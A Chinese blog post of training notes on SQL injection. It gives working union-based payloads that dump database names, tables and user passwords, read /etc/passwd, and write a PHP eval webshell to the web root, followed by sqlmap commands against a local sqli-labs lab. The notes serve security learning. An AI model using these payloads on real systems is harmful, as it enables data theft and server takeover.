<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <link rel="manifest" href="/images/manifest.json">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"got17.cn","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.13.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":true,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="第二天讲sql注入以及其中的一些绕过方法。">
<meta property="og:type" content="article">
<meta property="og:title" content="【网络安全4x02】洞明科技网络安全培训 --- day2">
<meta property="og:url" content="http://got17.cn/1094/index.html">
<meta property="og:site_name" content="gaoteng&#39;s blog">
<meta property="og:description" content="第二天讲sql注入以及其中的一些绕过方法。">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2020-08-21T15:35:08.000Z">
<meta property="article:modified_time" content="2022-09-03T03:28:56.706Z">
<meta property="article:author" content="gaoteng17">
<meta property="article:tag" content="网络安全">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://got17.cn/1094/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://got17.cn/1094/","path":"1094/","title":"【网络安全4x02】洞明科技网络安全培训 --- day2"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>【网络安全4x02】洞明科技网络安全培训 --- day2 | gaoteng's blog</title>
  






  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">gaoteng's blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">手动注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">1.1.</span> <span class="nav-text">1. 判断是否存在注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E7%8C%9C%E5%88%97%E6%95%B0"><span class="nav-number">1.2.</span> <span class="nav-text">2. 猜列数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-union%E6%9F%A5%E8%AF%A2%E7%88%86%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-number">1.3.</span> <span class="nav-text">3. union查询爆当前数据库名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%97%E8%A1%A8"><span class="nav-number">1.4.</span> <span class="nav-text">4. 爆数据库列表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E7%88%86tables%E5%88%97%E8%A1%A8"><span class="nav-number">1.5.</span> <span class="nav-text">5. 爆tables列表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%E7%88%86columns%E5%88%97%E8%A1%A8"><span class="nav-number">1.6.</span> <span class="nav-text">6. 爆columns列表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-%E7%88%86%E7%9B%B8%E5%85%B3column%E5%86%85%E5%AE%B9"><span class="nav-number">1.7.</span> <span class="nav-text">7. 爆相关column内容</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6"><span class="nav-number">1.8.</span> <span class="nav-text">8. 读取本地文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-%E5%86%99%E5%85%A5%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">1.9.</span> <span class="nav-text">9. 写入反弹shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">sqlmap注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-GET-%E5%8D%95%E4%B8%AA%E5%8F%82%E6%95%B0"><span class="nav-number">2.1.</span> <span class="nav-text">1. [GET]单个参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-GET-%E5%A4%9A%E4%B8%AA%E5%8F%82%E6%95%B0"><span class="nav-number">2.2.</span> <span class="nav-text">2. [GET]多个参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-GET-%E5%A4%9A%E4%B8%AAURL"><span class="nav-number">2.3.</span> <span class="nav-text">3. [GET]多个URL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-POST-burp%E6%8F%90%E5%8F%96HTTP%E8%AF%B7%E6%B1%82%E7%94%9F%E6%88%90%E6%96%87%E4%BB%B6"><span class="nav-number">2.4.</span> <span class="nav-text">4. [POST]burp提取HTTP请求生成文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-POST-%E4%BD%BF%E7%94%A8%E2%80%93data%E4%BC%A0%E9%80%92post%E6%95%B0%E6%8D%AE"><span class="nav-number">2.5.</span> <span class="nav-text">5. [POST]使用–data传递post数据</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#COOKIE%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">COOKIE注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E5%88%A4%E6%96%AD"><span class="nav-number">3.1.</span> <span class="nav-text">1. 判断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%89%8B%E5%8A%A8%E6%A3%80%E6%B5%8B"><span class="nav-number">3.2.</span> <span class="nav-text">2. 手动检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-sqlmap%E6%B3%A8%E5%85%A5"><span class="nav-number">3.3.</span> <span class="nav-text">3. sqlmap注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap%E7%BB%8F%E5%85%B8%E8%AF%AD%E6%B3%95"><span class="nav-number">4.</span> <span class="nav-text">sqlmap经典语法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E2%80%93banner"><span class="nav-number">4.1.</span> <span class="nav-text">1. –banner</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-g-%E2%80%9C%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95%E2%80%9D"><span class="nav-number">4.2.</span> <span class="nav-text">2. -g “谷歌语法”</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E2%80%93sql-shell"><span class="nav-number">4.3.</span> <span class="nav-text">3. –sql-shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E2%80%93os-shell"><span class="nav-number">4.4.</span> <span class="nav-text">4. –os-shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E2%80%93os-cmd"><span class="nav-number">4.5.</span> <span class="nav-text">5. –os-cmd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%E2%80%93file-read"><span class="nav-number">4.6.</span> <span class="nav-text">6. –file-read</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-%E2%80%93file-write-%E2%80%93file-dest"><span class="nav-number">4.7.</span> <span class="nav-text">7. –file-write –file-dest</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-%E2%80%93dbms-x3D-%E2%80%9DMySQL%E2%80%9D"><span class="nav-number">4.8.</span> <span class="nav-text">8. –dbms&#x3D;”MySQL”</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-%E2%80%93sql-query"><span class="nav-number">4.9.</span> <span class="nav-text">9. –sql-query</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-%E2%80%93sql-file"><span class="nav-number">4.10.</span> <span class="nav-text">10. –sql-file</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-%E2%80%93proxy-x3D-%E2%80%9DIP-%E7%AB%AF%E5%8F%A3%E2%80%9D"><span class="nav-number">4.11.</span> <span class="nav-text">11. –proxy&#x3D;”IP:端口”</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-%E2%80%93technique"><span class="nav-number">4.12.</span> <span class="nav-text">12. –technique</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#13-%E2%80%93fresh-queries"><span class="nav-number">4.13.</span> <span class="nav-text">13. –fresh-queries</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14-%E2%80%93flush-session"><span class="nav-number">4.14.</span> <span class="nav-text">14. –flush-session</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#15-%E2%80%93batch"><span class="nav-number">4.15.</span> <span class="nav-text">15. –batch</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#16-%E2%80%93start-%E2%80%93stop"><span class="nav-number">4.16.</span> <span class="nav-text">16. –start –stop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#17-%E2%80%93first-%E2%80%93last"><span class="nav-number">4.17.</span> <span class="nav-text">17. –first –last</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="nav-number">5.</span> <span class="nav-text">常见绕过方式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">5.1.</span> <span class="nav-text">1. 双写绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">5.2.</span> <span class="nav-text">2. 大小写绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC"><span class="nav-number">5.3.</span> <span class="nav-text">3. 注释绕过空格</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E7%A9%BA%E6%A0%BC%E5%85%B6%E4%BB%96%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="nav-number">5.4.</span> <span class="nav-text">4. 空格其他绕过方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E8%BF%87%E6%BB%A4%E7%AD%89%E5%8F%B7-x3D-%E7%BB%95%E8%BF%87"><span class="nav-number">5.5.</span> <span class="nav-text">5. 过滤等号&#x3D;绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">6.</span> <span class="nav-text">宽字节注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A6%82%E5%BF%B5"><span class="nav-number">6.1.</span> <span class="nav-text">概念</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="nav-number">6.2.</span> <span class="nav-text">前提条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%AD%A5%E9%AA%A4"><span class="nav-number">6.3.</span> <span class="nav-text">注入步骤</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">7.</span> <span class="nav-text">二次查询注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E5%87%BD%E6%95%B0"><span class="nav-number">7.1.</span> <span class="nav-text">基础函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B"><span class="nav-number">7.2.</span> <span class="nav-text">注入过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%88%86%E5%BD%93%E5%89%8D%E5%BA%93%E5%90%8D"><span class="nav-number">7.2.1.</span> <span class="nav-text">1. 爆当前库名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%8A%A5%E8%A1%A8%E5%90%8D"><span class="nav-number">7.2.2.</span> <span class="nav-text">2. 报表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E7%88%86%E5%88%97%E5%90%8D"><span class="nav-number">7.2.3.</span> <span class="nav-text">3. 爆列名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%9F%A5%E6%95%B0%E6%8D%AE"><span class="nav-number">7.2.4.</span> <span class="nav-text">4. 查数据</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="gaoteng17"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">gaoteng17</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">94</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">82</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/gaoteng17" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;gaoteng17" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:gaoteng17@gmail.com" title="E-Mail → mailto:gaoteng17@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://weibo.com/u/5544866728" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5544866728" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
      </span>
  </div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://got17.cn/1094/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="gaoteng17">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gaoteng's blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="【网络安全4x02】洞明科技网络安全培训 --- day2 | gaoteng's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          【网络安全4x02】洞明科技网络安全培训 --- day2
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-08-21 23:35:08" itemprop="dateCreated datePublished" datetime="2020-08-21T23:35:08+08:00">2020-08-21</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-09-03 11:28:56" itemprop="dateModified" datetime="2022-09-03T11:28:56+08:00">2022-09-03</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <p>第二天讲sql注入以及其中的一些绕过方法。</p>
<span id="more"></span>

<h1 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h1><h2 id="1-判断是否存在注入点"><a href="#1-判断是否存在注入点" class="headerlink" title="1. 判断是否存在注入点"></a>1. 判断是否存在注入点</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">33</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>  #恒真</span><br><span class="line">?id<span class="operator">=</span><span class="number">33</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>  #恒假</span><br></pre></td></tr></table></figure>

<h2 id="2-猜列数"><a href="#2-猜列数" class="headerlink" title="2. 猜列数"></a>2. 猜列数</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">33</span> <span class="keyword">order</span> <span class="keyword">by</span> x</span><br></pre></td></tr></table></figure>

<p>二分查找。</p>
<h2 id="3-union查询爆当前数据库名"><a href="#3-union查询爆当前数据库名" class="headerlink" title="3. union查询爆当前数据库名"></a>3. union查询爆当前数据库名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-33</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="type">binary</span>(group_concat(<span class="keyword">user</span>(),database(),curtime())),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span></span><br></pre></td></tr></table></figure>

<p>这里加负号避免前面正常显示的数据占用了位置导致后面不显示。</p>
<h2 id="4-爆数据库列表"><a href="#4-爆数据库列表" class="headerlink" title="4. 爆数据库列表"></a>4. 爆数据库列表</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-33</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="type">binary</span>(group_concat(schema_name)),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span> <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure>

<p><code>group_concat</code>可以将查到的全部信息一行显示。</p>
<h2 id="5-爆tables列表"><a href="#5-爆tables列表" class="headerlink" title="5. 爆tables列表"></a>5. 爆tables列表</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-33</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="type">binary</span>(group_concat(table_name)),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;cms&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="6-爆columns列表"><a href="#6-爆columns列表" class="headerlink" title="6. 爆columns列表"></a>6. 爆columns列表</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-33</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="type">binary</span>(group_concat(column_name)),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;cms_users&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="7-爆相关column内容"><a href="#7-爆相关column内容" class="headerlink" title="7. 爆相关column内容"></a>7. 爆相关column内容</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-33</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="type">binary</span>(group_concat(userid,<span class="string">&#x27; &#x27;</span>,username,<span class="string">&#x27; &#x27;</span>,password)),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span> <span class="keyword">from</span> cms_users</span><br></pre></td></tr></table></figure>

<h2 id="8-读取本地文件"><a href="#8-读取本地文件" class="headerlink" title="8. 读取本地文件"></a>8. 读取本地文件</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-33</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span></span><br></pre></td></tr></table></figure>

<h2 id="9-写入反弹shell"><a href="#9-写入反弹shell" class="headerlink" title="9. 写入反弹shell"></a>9. 写入反弹shell</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-33</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;&lt;?php @eval($_POST[gt]);?&gt;&#x27;</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/html/gt.php&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h1><h2 id="1-GET-单个参数"><a href="#1-GET-单个参数" class="headerlink" title="1. [GET]单个参数"></a>1. [GET]单个参数</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="2-GET-多个参数"><a href="#2-GET-多个参数" class="headerlink" title="2. [GET]多个参数"></a>2. [GET]多个参数</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#指定参数</span><br><span class="line">sqlmap.py <span class="operator">-</span>u &quot;http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1&amp;cc=1&quot;</span><br><span class="line"><span class="operator">-</span>p &quot;id&quot;</span><br></pre></td></tr></table></figure>

<h2 id="3-GET-多个URL"><a href="#3-GET-多个URL" class="headerlink" title="3. [GET]多个URL"></a>3. [GET]多个URL</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>m 文本文件</span><br><span class="line">选Y，对此URL注入测试；选n，自动进行下一个；选择q，退出探测。</span><br></pre></td></tr></table></figure>

<h2 id="4-POST-burp提取HTTP请求生成文件"><a href="#4-POST-burp提取HTTP请求生成文件" class="headerlink" title="4. [POST]burp提取HTTP请求生成文件"></a>4. [POST]burp提取HTTP请求生成文件</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>r E:\<span class="number">360</span>MoveData\Users\Administrator\Desktop\post.txt（第<span class="number">11</span>关）</span><br><span class="line">随意输入内容，使用burp抓包。</span><br></pre></td></tr></table></figure>

